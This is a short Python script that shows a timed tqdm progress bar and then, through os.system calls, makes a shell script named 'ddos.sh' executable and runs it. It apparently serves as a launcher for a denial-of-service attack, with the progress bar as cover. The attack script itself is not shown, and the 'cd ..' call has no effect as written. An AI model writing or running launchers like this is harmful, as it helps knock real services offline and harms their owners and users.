import tqdm,time,subprocess,os 

for i in tqdm.tqdm(range(100)):
    time.sleep(0.1)

os.system("cd ..")
os.system("chmod +x ddos.sh")
os.system("./ddos.sh")
